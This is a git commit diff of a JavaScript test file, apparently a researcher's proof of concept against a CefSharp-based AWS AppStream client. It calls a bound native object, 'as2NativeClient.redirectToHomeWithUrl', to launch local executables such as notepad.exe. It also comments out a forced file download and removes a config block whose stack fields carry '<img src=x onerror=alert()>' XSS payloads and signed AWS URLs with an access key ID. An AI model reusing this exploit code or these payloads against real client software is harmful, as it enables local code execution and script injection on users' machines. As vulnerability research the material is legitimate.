20809824e5fcbe37eb7b351491c8e6f4289d25a6
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 00:26:06 +0530

    Update tmp.js

--- tmp.js
+++ tmp.js
@@ -1,21 +1,29 @@
 
 
-d=document.createElement("a")
-d.href=window.URL.createObjectURL(new Blob(['blaaaaat'], {type: 'text/plain'}))
-d.setAttribute("download","1337.txt")
-d.click()
 
         window.CefSharp.BindObjectAsync("as2NativeClient")
         .then((result) => {
           if(window.as2NativeClient) {
             console.log("NC Object bound");
-            window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
+                  
+            
+            window.as2NativeClient.redirectToHomeWithUrl("C:\Windows\System32\notepad.exe");
+
+           // window.as2NativeClient.redirectToHomeWithUrl("C:\\Users\\rakesh\\Desktop\\1.py");
           }
         })
       
 
 
+  /*
   
+d=document.createElement("a")
+d.href=window.URL.createObjectURL(new Blob(['blaaaaat'], {type: 'text/plain'}))
+d.setAttribute("download","1337.txt")
+d.click()
+
+
+*/
   /*var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
@@ -31,21 +39,6 @@ d.click()
 
 //alert()
 
- /*window.siteConfig = {
-    logLevel: "WARN",
-    cdnURL: "https://appstream2.us-east-1.aws.amazon.com/",
-    isManagedStack: false,
-    isImageBuilderSession: false,
-    stack: "ExampleStack",
-    stackOwnerAccountId: "597299136010",
-    region: "us-east-1",
-    userId: "aaa",
-    feedbackURL: "https://example.com/feedback",
-    authType: "SIGNED_URL",
-    themeInformation: {"titleText":"BrowserTab Title","footerLinks":[{"footerLinkURL":"C:\\Users\\rakesh\\Desktop\\1.py","displayName":"Rakeshmane.com-New"}],"faviconURL":"https://themes.us-east-1.amazonappstream.com/597299136010/theme_ExampleStack/FAVICON_b8d1bdd3-9718-4eef-95a1-922faca28ea5.ico?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20200707T155850Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAIF6R5WCTTOL2UL7Q%2F20200707%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=6928e12e730685b272759a27d62e3458b6d918121be527bc17f4440d2b18c59a","organizationLogoURL":"https://themes.us-east-1.amazonappstream.com/597299136010/theme_ExampleStack/ORG_LOGO_03ad2311-7f42-4bbd-b44a-e6a1817f8bee.gif?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20200707T155850Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=AKIAIF6R5WCTTOL2UL7Q%2F20200707%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=fc472ae64e754748af762283d2fe2db658394b43737c6d94e50481e64be2c066","stylingProperty":{"spinnerColor":"#666666","bodyTextColor":"#666666","backgroundColor":"#FFFFFF","buttonColor":"#8AC53E","linkColor":"#0070BA"},"stylingName":"Blue (#0070BA)","themeName":"theme_ExampleStack"},
-    stackInfo: {"redirectURL":"http://ded-example.com/one.py","embedHostDomains":null,"state":"ACTIVE","accessEndpoints":null,"createdTime":"Jul 4, 2020 5:27:42 PM","applicationSettings":{"settingsGroup":"ExampleStackLol\u0027\"`\u003e\u003cimg src\u003dx onerror\u003dalert()\u003e","enabled":true,"s3KeyPrefix":null,"s3BucketName":"appstream-app-settings-us-east-1-597299136010-6dbkrz0b"},"themeName":"theme_ExampleStack","userSettings":[{"action":"CLIPBOARD_COPY_FROM_LOCAL_DEVICE","permission":"ENABLED"},{"action":"CLIPBOARD_COPY_TO_LOCAL_DEVICE","permission":"ENABLED"},{"action":"FILE_UPLOAD","permission":"ENABLED"},{"action":"FILE_DOWNLOAD","permission":"ENABLED"},{"action":"PRINTING_TO_LOCAL_DEVICE","permission":"ENABLED"}],"iamRoleArn":null,"storageConnectors":[{"resourceIdentifier":"appstream2-36fb080bb8-us-east-1-597299136010","connectorType":"S3","domains":null}],"feedbackURL":"https://example.com/feedback","name":"ExampleStack","displayName":"Test","arn":"arn:aws:appstream:us-east-1:597299136010:stack/ExampleStack","description":"This is a sample stack with sample applicationsLol\u0027\"`\u003e\u003cimg src\u003dx onerror\u003dalert()\u003e\n","awsAccountId":"597299136010","stackErrors":null},
-    useThirdPartySpinner: false,
-    defaultDcvJS: "2020.0-8438"
-  };*/
+
 
 
